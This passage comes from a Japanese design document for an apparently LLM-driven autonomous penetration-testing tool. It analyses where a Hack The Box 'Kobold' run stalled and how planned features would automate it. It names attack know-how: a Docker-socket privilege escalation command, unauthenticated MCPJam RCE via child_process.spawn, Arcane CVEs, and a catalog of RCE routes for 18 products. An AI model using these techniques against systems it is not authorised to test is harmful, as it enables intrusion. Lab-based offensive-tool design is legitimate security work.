         └── スプリント8: LLMRouter ←── EGATS統合 (スプリント7) でTDI利用可能
              │
              └── スプリント9: RAG基盤 ←── DB層 (スプリント2)
                   │
                   ├── スプリント10: メモリ蒸留 + debrief ←── RAG (スプリント9)
                   │
                   └── スプリント11: 仮説第3層有効化 ←── RAG (スプリント9) + 4層仮説 (スプリント6)
```

スプリント1〜4は互いに独立しており、**並行実施も可能**。スプリント5以降は依存関係に従って順次実施する。

各スプリント完了時のチェックリスト:
- [ ] 新規コンポーネントのユニットテスト全パス
- [ ] Orchestratorとの統合テストパス（接続スプリントのみ）
- [ ] 実データ（kobold.htb相当）でのエンドツーエンド検証
- [ ] 既存テストスイート全パス（回帰なし）
- [ ] `_safe_import_component()`パターンで未導入時にも動作すること
- [ ] MCPブリッジで新規ツールが正しく登録されること（ツール追加スプリントのみ）


---


## 8. 実証: kobold.htb攻略での行き詰まりと統合後の解決

本セクションでは、実際のHTB Kobold攻略（03_htb_kobold_report.md参照）で発生した全ての行き詰まりを洗い出し、統合後の各機能が具体的にどう解決するかを検証する。これにより、統合設計が机上の空論ではなく実戦で効果を発揮することを実証する。


### 8.1 攻略中に発生した全行き詰まりポイント

| # | 行き詰まり | タイムライン | 所要時間 | 自力解決 |
|---|---|---|---|---|
| **F1** | サブドメイン列挙: 5Kワードリストに`mcp`が含まれず発見できない | 09:25→09:28 | 3分+外部参照 | **NO** — Writeup参照 |
| **F2** | TLS 1.3タイムアウト: mcp.kobold.htbに接続不可 | 09:35→09:40 | 5分 | YES — 手動試行 |
| **F3** | Arcane認証突破: デフォルトクレデンシャル変更済み、CVE-2026-23944も使えず | 09:12→09:25 | **13分** | **NO** — 行き詰まり |
| **F4** | MCPJam Inspectorの存在に気づかない: サブドメイン発見前にArcaneに固執 | 09:05→09:25 | **20分** | **NO** — F1に依存 |
| **F5** | Docker escape: `-u 0` なしで権限不足 | 09:55 | 1分 | YES — 手動修正 |
| **F6** | Docker escape: `--entrypoint` の上書きが必要 | 09:55 | 1分 | YES — 手動修正 |
| **F7** | MCPツールがセッション途中で使えない: 再起動が必要 | セッション全体 | — | YES — 再起動 |


### 8.2 各行き詰まりに対する統合機能の効果

#### F1: サブドメイン列挙の失敗（最も致命的 — 攻略全体のボトルネック）

**現在の問題**: `subdomains-top1million-5000.txt` に `mcp` が含まれず、`mcp.kobold.htb`（MCPJam Inspector = RCEの入口）を発見できなかった。Writeupを参照して初めて20K+ワードリストの必要性を認識した。

**統合後の解決**:

**4層仮説生成（P2）のルールベース第1層**が3つの経路でこの問題を解決する:

経路1 — **ワイルドカードSAN検出**: Nmap結果のTLS証明書情報（`SAN=*.kobold.htb`）をStateStore経由で検知し、「ワイルドカードSAN検出 → 20K+ワードリストでvhost列挙を推奨」仮説を自動生成する。

経路2 — **SSRF_HOSTNAME_PATTERNS辞書**: これはNirvanaに組み込まれた汎用的なサブドメイン辞書であり、9カテゴリ・70+パターンを含む。MCPJamに限らず、監視系（zabbix, grafana, prometheus等）、CI/CD系（jenkins, gitlab等）、DB系（db, mysql, redis等）、認証系（keycloak, auth, sso等）など、ペンテストで頻出するサブドメインパターンが網羅されている。`mcp` カテゴリ（`["mcp", "mcpjam", "inspector", "model-context-protocol"]`）はその70+パターンの一部であり、kobold.htb専用の知識ではなく汎用的なドメイン知識である。

経路3 — **プロダクトカタログの動的拡張**: `_load_external_product_catalog()` により外部カタログファイルからの動的追加が可能。新しい製品やパターンを発見したら追加すれば全ミッションに反映される。

**RAG MetaPatterns（K3）**: 今回の「5Kワードリスト→失敗→20K+で成功」パターンがRAGに保存されるため、次回以降は自動的に20K+を使用する。

**効果**: Writeup参照が不要になり、自律的にサブドメインを発見できる。


#### F2: TLS 1.3タイムアウト

**現在の問題**: `curl -sk https://mcp.kobold.htb/` がTLS 1.3ハンドシェイクでタイムアウト。手動で `--tls-max 1.2` を試行して解決した。

**統合後の解決**:

**ErrorHandler（E1）**: `classify("TLS handshake timeout")` → `SSL_CERTIFICATE_ERROR` → `recover()` → `RecoveryAction.RETRY_WITH_ALT_PARAMS` + `alt_params: {"tls_version": "1.2"}`。ツール実行がタイムアウトした場合、ErrorHandlerが自動的にTLSバージョンの変更を提案し、再試行する。

**RAG MetaPatterns（K3）**: `save_meta_pattern(pattern_type="failure_recovery", trigger={"error": "TLS handshake timeout"}, action={"solution": "--tls-max 1.2"})` として保存される。次回以降、同様のTLS問題が発生した場合に自動適用される。

**効果**: 手動試行が不要になり、自動リカバリーされる。


#### F3: Arcane認証突破の行き詰まり（13分間の空白）

**現在の問題**: Arcane Docker Management v1.13.0のデフォルトクレデンシャル（arcane:arcane-admin）が変更されており、CVE-2026-23944（認証バイパス）もリモート環境未設定で使えず、13分間行き詰まった。

**統合後の解決**:

**EGATS+Forest（P1）**: UCBの探索/活用バランスにより、Arcane認証突破ノードのTDI（Task Difficulty Index）が上昇する。具体的には、認証試行が繰り返し失敗すると `success_rate` が低下し、TDI値が `prune_threshold`（0.8）を超えた時点で**自動的に枝刈り**される。同時に、未訪問のノード（他サブドメイン、他ポート）のUCBスコアが探索ボーナスにより上昇し、自動的にピボットが発生する。

**ErrorHandler（E1）**: `classify("Invalid username or password")` → `AUTHENTICATION_FAILED` → 数回のリトライ後 `SKIP` を推奨。無限に同じ認証を試行することを防ぐ。

**4層仮説生成（P2）**: プロダクトカタログに `"arcane"` が含まれており、CVE-2026-23944（認証バイパス）とCVE-2026-23520（コマンドインジェクション）の仮説を生成するが、検証失敗時に`confidence`が`-0.2`ずつ低下する。3回失敗するとconfidenceが閾値以下になり、別の仮説（MCPJam Inspector等）が自動的に最高優先度になる。

**効果**: 13分の行き詰まりが自動ピボットにより数分に短縮される。


#### F4: MCPJam Inspectorの存在に気づかない（F1に依存する問題）

**現在の問題**: サブドメイン（mcp.kobold.htb）が発見できなかったため、MCPJam Inspectorの存在自体に気づかず、Arcaneに固執して20分間を費やした。

**統合後の解決**:

F1が解決されれば、`mcp.kobold.htb` が発見される。その時点で4層仮説生成（P2）のプロダクトカタログが自動的に機能する:

1. ルールベース第1層がサブドメイン `mcp.*` を検出
2. SSRF_HOSTNAME_PATTERNS の `"mcp"` カテゴリにマッチ
3. PRODUCT_CATALOG の `"mcpjam"` エントリから攻撃仮説を自動生成:
   - パス: `/api/mcp/connect`, `/api/mcp/servers`
   - RCE手法: `serverConfig.command → child_process.spawn() unauthenticated RCE`
   - exploitation_notes: MCP stdio JSON-RPCの出力取得方法（ファイル書き込み、コールバック、nohup+background）

4. この仮説は `confidence: 0.75` で生成され、Arcane認証失敗で低下した仮説よりも高優先度になる

**効果**: MCPJam Inspectorを自動発見し、RCE手法まで提案できる。


#### F5/F6: Docker escape の試行錯誤

**現在の問題**: Docker escapeで2つの問題に遭遇した。(1) `-u 0` なしでコンテナがデフォルトユーザー（非root）で実行され `/mnt/root/` にアクセス不可。(2) エントリポイントが `/etc/init.d/rc.local` で `cat` が実行されず `--entrypoint cat` の上書きが必要。

**統合後の解決**:

**4層仮説生成（P2）のルールベース第1層**: グループメンバーシップによる権限昇格ルールが含まれている。`ben` が `operator` グループに所属し、`/var/run/docker.sock` が存在することを検知すると、Docker socket escape仮説を生成する。この仮説にはコンテナ実行のベストプラクティス（`-u 0` でrootユーザー指定、`--entrypoint` で上書き）が含まれる。

**RAG AttackMemory（K1）**: 今回の攻略がRAGに保存された後、次回以降は「operator group → sg docker → docker run -u 0 --entrypoint cat -v /:/mnt」の手順が `search_hybrid("Docker socket privilege escalation")` で即座にヒットする。

**効果**: 試行錯誤なしで最初から正しいパラメータでDocker escapeを実行できる。


#### F7: MCPツールのセッション途中ロード不可

**現在の問題**: MCPブリッジを今回のセッション中に実装・登録したが、Claude Code CLIはセッション開始時にのみMCPサーバーをロードするため、セッション再起動が必要だった。

**統合後の解決**: **解決しない**。これはClaude Code CLI自体の制約（MCPサーバーはセッション開始時にロード）であり、Phantom側の改修では対応不可。ただし、MCPブリッジが事前に設定されていれば次回以降は問題にならない。


### 8.3 統合効果サマリ

| 行き詰まり | 現在 | 統合後 | 主要な解決機能 | 推定時間短縮 |
|---|---|---|---|---|
| **F1: 5Kワードリスト不足** | Writeup参照 | **自動解決** | 4層仮説(P2): SSRF_HOSTNAME_PATTERNS + RAG MetaPatterns(K3) | Writeup参照が不要 |
| **F2: TLS 1.3タイムアウト** | 手動試行5分 | **自動解決** | ErrorHandler(E1) + RAG MetaPatterns(K3) | 5分→即時 |
| **F3: Arcane認証行き詰まり** | 13分ロス | **自動ピボット** | EGATS(P1): UCB+枝刈り + ErrorHandler(E1) + 4層仮説(P2) | 13分→2〜3分 |
| **F4: MCPJam未発見** | F1に依存 | **自動解決** | 4層仮説(P2): PRODUCT_CATALOGの`mcpjam`エントリ | F1解決で連鎖解決 |
| **F5: Docker -u 0** | 手動修正1分 | **自動解決** | 4層仮説(P2) + RAG AttackMemory(K1) | 1分→即時 |
| **F6: Docker --entrypoint** | 手動修正1分 | **自動解決** | RAG AttackMemory(K1) | 1分→即時 |
| **F7: MCP途中ロード不可** | 再起動 | **未解決** | Claude Code CLI自体の制約 | — |

**7つの行き詰まりのうち6つが統合により自動解決される。**

特に最も致命的だったF1（サブドメイン列挙の失敗）は、4層仮説生成のSSRF_HOSTNAME_PATTERNSが9カテゴリ・70+パターンの**汎用的なペンテストドメイン知識**として`mcp`を含んでおり、kobold.htb固有の知識に依存せずに解決できる。さらにRAG MetaPatternsにより「20K+ワードリストを使用すべき」という教訓が永続化され、同種の失敗が全ての将来のミッションで防止される。


### 8.4 プロダクトカタログの汎用性について

4層仮説生成のPRODUCT_CATALOGとSSRF_HOSTNAME_PATTERNSは、kobold.htb専用の知識ではなく**ペンテスターのドメイン知識をコード化した汎用辞書**である。

**PRODUCT_CATALOG（18製品 + 外部カタログ動的拡張）**:

| 製品 | ポート | RCE手法 |
|---|---|---|
| zabbix | 80, 8080 | Script API (execute_on=1) |
| cacti | 80 | CVE-2025-24367 graph template RCE |
| grafana | 3000 | Directory traversal + credential leak |
| prometheus | 9090 | 内部サービス列挙 |
| jenkins | 8080 | Groovy Console RCE |
| gitea | 3000 | Open registration → source code → .env |
| gitlab | 80, 443 | CI/CD pipeline + Runner RCE |
| pgadmin | 80, 5050 | SQL execution + credential leak |
| phpmyadmin | 80 | INTO OUTFILE / load_file() |
| keycloak | 8080 | Client Secret leak / Token forgery |
| mailpit | 8025 | Email → password reset token capture |
| docker_api | 2375 | Container creation + host FS mount |
| portainer | 9443 | Docker API → container creation RCE |
| arcane | 3552, 8080 | lifecycle label injection / updater injection |
| mcpjam | 443, 3000 | /api/mcp/connect unauthenticated RCE |
| privatebin | 443, 80 | LFI via template cookie + .env読取 |
| wordpress | 80 | Plugin vulnerabilities (WPScan) |
| + 外部 | — | `_load_external_product_catalog()` で動的拡張可能 |

**SSRF_HOSTNAME_PATTERNS（9カテゴリ・70+パターン）**:

| カテゴリ | パターン |
|---|---|
| monitoring | zabbix, grafana, prometheus, nagios, icinga, cacti, checkmk, netdata, uptimekuma |
| cicd | jenkins, gitlab, gitea, drone, argo, argocd, tekton, concourse |
| database | db, mysql, postgres, postgresql, mariadb, redis, mongo, mongodb, elasticsearch, mssql |
| api | api, backend, internal-api, service, gateway, graphql |
| admin | admin, management, portal, dashboard, console, phpmyadmin, pgadmin, adminer |
| mail | mail, mailpit, mailhog, roundcube, smtp |
| auth | keycloak, auth, sso, ldap, oauth |
| container | portainer, rancher, registry, arcane, docker |
| mcp | mcp, mcpjam, inspector, model-context-protocol |
| infra | invoiceninja, nextcloud, minio, vault, rabbitmq, kafka, nats |

これらはHTBに限らず、実際のペネトレーションテストでも `db.target.com`（データベース管理画面）、`jenkins.target.com`（CI/CD）、`admin.target.com`（管理画面）等のサブドメインパターンとして一般的に使用される。


---


## 9. 統合しない機能とその理由

| 機能 | プロジェクト | 理由 |
|---|---|---|
| Flask REST API（34ルート） | HEXSTRIKE | Phantomの軽量Webダッシュボードと設計思想が異なる。規模が大きすぎる |
| Celery タスクキュー | HEXSTRIKE | 過剰。PhantomのThreadPoolExecutorで十分 |
| Textual TUI | Excalibur | PhantomはCLI-first。TUIは別プロジェクトとして分離すべき |
| Redis キャッシュ | HEXSTRIKE | 外部依存が増える。SQLiteキャッシュで代替可能 |
| Claude Agent SDK バックエンド | Nirvana/Excalibur | APIポリシーブロックの根本原因。統合すべきでない |
| `permission_mode="bypassPermissions"` | Nirvana/Excalibur | セキュリティリスク。Phantomのscope_guard設計が優れている |
| BrowserAgent（Playwright） | Nirvana | 有用だが統合範囲が大きい。Phase 2以降で検討 |
| PayloadEvolver（AMSI bypass） | Nirvana | 有用だがニッチ。Phase 2以降で検討 |
